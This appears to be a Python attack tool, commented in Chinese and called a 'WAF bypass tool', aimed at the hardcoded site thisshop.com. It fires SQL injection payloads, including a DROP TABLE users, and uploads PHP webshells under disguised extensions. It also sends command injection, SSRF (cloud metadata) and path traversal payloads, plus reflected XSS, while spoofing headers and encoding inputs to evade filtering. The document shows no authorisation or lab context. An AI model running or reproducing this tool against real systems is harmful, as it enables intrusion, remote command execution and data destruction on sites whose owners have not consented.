#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
增强WAF绕过工具 v2.0
目标: https://thisshop.com
功能: 多层次WAF绕过技术
"""

import requests
import time
import random
import json
import base64
import hashlib
from datetime import datetime
import threading

class EnhancedWAFBypassTool:
    def __init__(self):
        self.target = "https://thisshop.com"
        self.results = []
        self.session = requests.Session()
        self.success_count = 0
        self.total_attempts = 0

        # 用户代理池
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1'
        ]

        # 编码技术
        self.encoders = {
            'base64': base64.b64encode,
            'hex': lambda x: x.hex(),
            'url': lambda x: requests.utils.quote(x),
            'html': self.html_encode,
            'unicode': self.unicode_encode,
            'double_url': self.double_url_encode
        }

    def html_encode(self, text):
        """HTML编码"""
        return ''.join(f'&#{ord(c)};' for c in text)

    def unicode_encode(self, text):
        """Unicode编码"""
        return ''.join(f'\\u{ord(c):04x}' for c in text)

    def double_url_encode(self, text):
        """双重URL编码"""
        return requests.utils.quote(requests.utils.quote(text))

    def adaptive_delay(self):
        """自适应延迟"""
        delay = random.uniform(0.5, 2.0)
        time.sleep(delay)

    def random_headers(self):
        """随机生成请求头"""
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Cache-Control': 'max-age=0'
        }

        # 随机添加一些额外的头
        if random.random() < 0.3:
            headers['X-Forwarded-For'] = self.random_ip()
        if random.random() < 0.3:
            headers['X-Real-IP'] = self.random_ip()
        if random.random() < 0.2:
            headers['Referer'] = random.choice(['https://google.com', 'https://facebook.com', 'https://twitter.com'])

        return headers

    def random_ip(self):
        """生成随机IP"""
        return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"

    def make_request(self, url, method='POST', data=None, payload=None):
        """发送请求"""
        try:
            self.adaptive_delay()
            self.total_attempts += 1

            # 如果有payload，编码它
            if payload:
                encoded_payload = self.apply_encoding_techniques(payload)
                if method == 'POST':
                    if isinstance(data, dict):
                        data['username'] = encoded_payload
                        data['password'] = 'test'
                    else:
                        data = {'username': encoded_payload, 'password': 'test'}
                else:
                    if '?' in url:
                        url = f"{url}&username={encoded_payload}&password=test"
                    else:
                        url = f"{url}?username={encoded_payload}&password=test"

            headers = self.random_headers()

            if method == 'POST':
                response = self.session.post(url, data=data, headers=headers, timeout=30)
            else:
                response = self.session.get(url, headers=headers, timeout=30)

            return response

        except Exception as e:
            print(f"请求失败: {e}")
            return None

    def apply_encoding_techniques(self, payload):
        """应用编码技术"""
        techniques = ['base64', 'url', 'html', 'hex', 'unicode', 'double_url']
        selected_tech = random.choice(techniques)

        if selected_tech in self.encoders:
            encoded = self.encoders[selected_tech](payload.encode('utf-8'))
            if isinstance(encoded, bytes):
                encoded = encoded.decode('utf-8')
            return encoded
        return payload

    def test_sql_injection_advanced(self):
        """高级SQL注入测试"""
        print("[*] 执行高级SQL注入绕过测试...")

        advanced_payloads = [
            # 基础SQL注入
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "' AND SLEEP(5)--",

            # 编码混淆
            "'/**/OR/**/1=1--",
            "';%0aSELECT%0aNULL--",

            # 堆叠查询
            "'; DROP TABLE users--",

            # 时间盲注
            "' WAITFOR DELAY '0:0:5'--",
            "' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--",

            # 错误注入
            "' AND 1=CONVERT(INT,@@VERSION)--",
            "' AND 1=@@IDENTITY--",

            # 布尔盲注
            "' AND SUBSTRING((SELECT @@VERSION), 1, 1) > 'A'--",

            # 联合查询
            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--"
        ]

        for i, payload in enumerate(advanced_payloads, 1):
            print(f"[*] 测试 {i}/{len(advanced_payloads)}: {payload}")

            # 尝试多种编码组合
            for encoding_tech in ['base64', 'url', 'double_url']:
                encoded_payload = self.apply_encoding_techniques(payload)

                response = self.make_request(self.target, method='POST', payload=encoded_payload)

                if response and response.status_code == 200:
                    text = response.text.lower()

                    # 检查成功指标
                    success_indicators = [
                        'welcome', 'dashboard', 'logged in', 'success', 'welcome back',
                        'login successful', 'authenticated', 'profile', 'account'
                    ]

                    error_indicators = [
                        'error', 'invalid', 'failed', 'wrong', 'incorrect',
                        'access denied', 'forbidden', 'unauthorized'
                    ]

                    success_found = any(indicator in text for indicator in success_indicators)
                    error_found = any(indicator in text for indicator in error_indicators)

                    if success_found and not error_found:
                        print(f"[✓] SQL注入绕过成功! 编码: {encoding_tech}")
                        self.results.append({
                            'type': 'SQL Injection',
                            'payload': payload,
                            'encoding': encoding_tech,
                            'success': True,
                            'status': response.status_code
                        })
                        self.success_count += 1
                        return True
                    elif error_found:
                        print(f"[-] 检测到错误响应: {encoding_tech}")
                    else:
                        print(f"[-] 无明确响应: {encoding_tech}")
                else:
                    print(f"[-] 请求失败: {encoding_tech}")

        return False

    def test_file_upload_bypass(self):
        """文件上传绕过测试"""
        print("[*] 执行文件上传绕过测试...")

        # 多种webshell代码
        webshells = [
            # PHP webshell 1
            '''<?php
if(isset($_REQUEST['cmd'])) {
    $output = shell_exec($_REQUEST['cmd']);
    echo "<pre>$output</pre>";
}
?>''',

            # PHP webshell 2 (混淆版本)
            '''<?php
@$_=$_REQUEST['cmd'];@eval(@$_);?>
''',

            # 短webshell
            '''<?php eval($_POST['cmd']); ?>'''
        ]

        for i, webshell in enumerate(webshells, 1):
            print(f"[*] 测试webshell {i}/{len(webshells)}")

            # 不同的文件名和扩展名组合
            file_combinations = [
                ('shell.php', 'application/x-php'),
                ('shell.phtml', 'application/x-php'),
                ('shell.php3', 'application/x-php'),
                ('shell.php5', 'application/x-php'),
                ('shell.jpg', 'image/jpeg'),
                ('shell.png', 'image/png'),
                ('shell.gif', 'image/gif')
            ]

            for filename, content_type in file_combinations:
                files = {
                    'file': (filename, webshell, content_type),
                    'submit': ('submit', 'upload', 'application/x-www-form-urlencoded')
                }

                upload_url = f"{self.target}/upload"
                response = self.make_request(upload_url, method='POST', data=files)

                if response and response.status_code == 200:
                    text = response.text.lower()
                    upload_success = any(indicator in text for indicator in [
                        'upload successful', 'file uploaded', 'upload complete', 'success'
                    ])

                    if upload_success:
                        print(f"[✓] 文件上传成功! 文件名: {filename}")
                        self.results.append({
                            'type': 'File Upload',
                            'filename': filename,
                            'success': True,
                            'status': response.status_code
                        })
                        self.success_count += 1

                        # 尝试访问上传的文件
                        access_url = f"{self.target}/uploads/{filename}"
                        access_response = self.make_request(access_url)

                        if access_response and access_response.status_code == 200:
                            print(f"[✓] Webshell可访问!")
                            self.results.append({
                                'type': 'Webshell Access',
                                'url': access_url,
                                'success': True,
                                'status': access_response.status_code
                            })
                            self.success_count += 1
                            return True
                    else:
                        print(f"[-] 上传失败: {filename}")

        return False

    def test_command_injection_advanced(self):
        """高级命令注入测试"""
        print("[*] 执行高级命令注入绕过测试...")

        command_endpoints = [
            ('ping', 'host'),
            ('traceroute', 'target'),
            ('nslookup', 'domain'),
            ('whois', 'query'),
            ('exec', 'command'),
            ('system', 'cmd'),
            ('run', 'command')
        ]

        command_payloads = [
            '&& whoami',
            '&& ipconfig',
            '&& dir',
            '&& net user',
            '&& netstat -an',
            '&& tasklist',
            '&& powershell whoami',
            '|| dir',
            '| whoami',
            '& whoami',
            '&& cat /etc/passwd',
            '&& ls -la',
            '&& pwd'
        ]

        for endpoint, param in command_endpoints:
            print(f"[*] 测试端点: {endpoint}")

            for payload in command_payloads:
                test_url = f"{self.target}/{endpoint}"
                data = {param: payload}

                response = self.make_request(test_url, method='POST', data=data)

                if response and response.status_code == 200:
                    text = response.text

                    # 检查命令执行结果
                    execution_indicators = [
                        'Administrator', 'root', 'Users', 'C:\\', '/home/', '/etc/',
                        '192.168.', '127.0.0.1', 'localhost', 'cmd.exe', 'powershell'
                    ]

                    if any(indicator in text for indicator in execution_indicators):
                        print(f"[✓] 命令注入成功! 端点: {endpoint}")
                        self.results.append({
                            'type': 'Command Injection',
                            'endpoint': endpoint,
                            'payload': payload,
                            'success': True,
                            'status': response.status_code
                        })
                        self.success_count += 1
                        return True
                    else:
                        print(f"[-] 命令注入失败: {endpoint}")

        return False

    def test_ssrf_and_lfi(self):
        """测试SSRF和本地文件包含"""
        print("[*] 执行SSRF和LFI测试...")

        # SSRF payloads
        ssrf_payloads = [
            'http://127.0.0.1',
            'http://localhost',
            'http://169.254.169.254',  # AWS元数据
            'file:///etc/passwd',
            'file:///c:/windows/system32/drivers/etc/hosts',
            'php://input',
            'data://text/plain;base64,SGVsbG8gV29ybGQh'
        ]

        lfi_payloads = [
            '../../../etc/passwd',
            '../../../windows/win.ini',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//etc/passwd',
            '....\\....\\....\\windows\\win.ini'
        ]

        # 测试文件读取
        file_read_params = ['file', 'page', 'template', 'include', 'view']

        for param in file_read_params:
            for payload in lfi_payloads:
                data = {param: payload}
                response = self.make_request(self.target, method='POST', data=data)

                if response and response.status_code == 200:
                    text = response.text

                    if 'root:' in text or '[fonts]' in text or 'hosts' in text:
                        print(f"[✓] LFI成功! 参数: {param}")
                        self.results.append({
                            'type': 'LFI',
                            'parameter': param,
                            'payload': payload,
                            'success': True,
                            'status': response.status_code
                        })
                        self.success_count += 1
                        return True

        # 测试SSRF
        ssrf_endpoints = ['proxy', 'url', 'redirect', 'fetch']

        for endpoint in ssrf_endpoints:
            for payload in ssrf_payloads:
                test_url = f"{self.target}/{endpoint}"
                data = {'url': payload}

                response = self.make_request(test_url, method='POST', data=data)

                if response and response.status_code == 200:
                    text = response.text

                    if '169.254.169.254' in text or 'metadata' in text or 'root:' in text:
                        print(f"[✓] SSRF成功! 端点: {endpoint}")
                        self.results.append({
                            'type': 'SSRF',
                            'endpoint': endpoint,
                            'payload': payload,
                            'success': True,
                            'status': response.status_code
                        })
                        self.success_count += 1
                        return True

        return False

    def test_xss_reflected(self):
        """测试反射型XSS"""
        print("[*] 执行反射型XSS测试...")

        xss_payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            "'<script>alert(1)</script>",
            '<img src=x onerror="alert(1)">',
            '<svg onload="alert(1)">',
            '<body onload="alert(1)">',
            '<input autofocus onfocus="alert(1)">',
            '<select autofocus onfocus="alert(1)">',
            '<textarea autofocus onfocus="alert(1)">',
            '<keygen autofocus onfocus="alert(1)">',
            '<video><source onerror="alert(1)">',
            '<audio src=x onerror="alert(1)">',
            '<details open ontoggle="alert(1)">',
            '<marquee onstart="alert(1)">',
            '"\'><img src=x onerror="alert(1)">',
            'javascript:alert(1)',
            'data:text/javascript,alert(1)',
            '<iframe src="javascript:alert(1)">'
        ]

        xss_params = ['q', 'search', 'query', 'keyword', 'term', 'name', 'user', 'id']

        for param in xss_params:
            for payload in xss_payloads:
                data = {param: payload}
                response = self.make_request(self.target, method='POST', data=data)

                if response and response.status_code == 200:
                    text = response.text

                    if payload in text:
                        print(f"[✓] XSS成功! 参数: {param}")
                        self.results.append({
                            'type': 'XSS Reflected',
                            'parameter': param,
                            'payload': payload,
                            'success': True,
                            'status': response.status_code
                        })
                        self.success_count += 1
                        return True

        return False

    def generate_report(self):
        """生成综合报告"""
        report = {
            'target': self.target,
            'timestamp': datetime.now().isoformat(),
            'total_attempts': self.total_attempts,
            'successful_bypasses': self.success_count,
            'success_rate': (self.success_count / max(self.total_attempts, 1)) * 100,
            'results': self.results,
            'summary': {
                'sql_injection_success': len([r for r in self.results if r['type'] == 'SQL Injection' and r['success']]),
                'file_upload_success': len([r for r in self.results if r['type'] == 'File Upload' and r['success']]),
                'command_injection_success': len([r for r in self.results if r['type'] == 'Command Injection' and r['success']]),
                'lfi_success': len([r for r in self.results if r['type'] == 'LFI' and r['success']]),
                'ssrf_success': len([r for r in self.results if r['type'] == 'SSRF' and r['success']]),
                'xss_success': len([r for r in self.results if r['type'] == 'XSS Reflected' and r['success']])
            }
        }

        # 保存报告
        filename = f"enhanced_waf_bypass_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, ensure_ascii=False, indent=2)

        print(f"\n[+] 详细报告已保存: {filename}")
        return report

    def run(self):
        """运行完整的WAF绕过测试"""
        print("=" * 70)
        print("增强WAF绕过工具 v2.0")
        print("目标:", self.target)
        print("=" * 70)

        start_time = time.time()

        # 执行各种测试
        tests = [
            ("SQL注入绕过", self.test_sql_injection_advanced),
            ("文件上传绕过", self.test_file_upload_bypass),
            ("命令注入绕过", self.test_command_injection_advanced),
            ("SSRF和LFI绕过", self.test_ssrf_and_lfi),
            ("XSS反射绕过", self.test_xss_reflected)
        ]

        for test_name, test_func in tests:
            print(f"\n{'='*20} {test_name} {'='*20}")
            try:
                test_func()
            except Exception as e:
                print(f"[X] {test_name}测试出错: {e}")

        # 生成报告
        end_time = time.time()
        duration = end_time - start_time

        print("\n" + "=" * 70)
        print("增强WAF绕过测试结果")
        print("=" * 70)
        print(f"目标: {self.target}")
        print(f"测试耗时: {duration:.2f} 秒")
        print(f"总尝试次数: {self.total_attempts}")
        print(f"成功绕过次数: {self.success_count}")
        print(f"成功率: {(self.success_count / max(self.total_attempts, 1)) * 100:.2f}%")

        if self.results:
            print("\n成功案例:")
            for i, result in enumerate([r for r in self.results if r['success']], 1):
                print(f"  {i}. {result['type']} - {result.get('description', result.get('payload', result.get('filename', 'N/A')))}")

        # 生成最终报告
        final_report = self.generate_report()

        return self.success_count > 0

def main():
    try:
        tool = EnhancedWAFBypassTool()
        success = tool.run()

        if success:
            print("\n[✓] 增强WAF绕过测试成功完成！发现可利用漏洞。")
            return 0
        else:
            print("\n[!] 增强WAF绕过测试完成，目标具有强大的防护能力。")
            return 1

    except Exception as e:
        print(f"\n[X] 执行错误: {e}")
        return 1

if __name__ == "__main__":
    exit(main())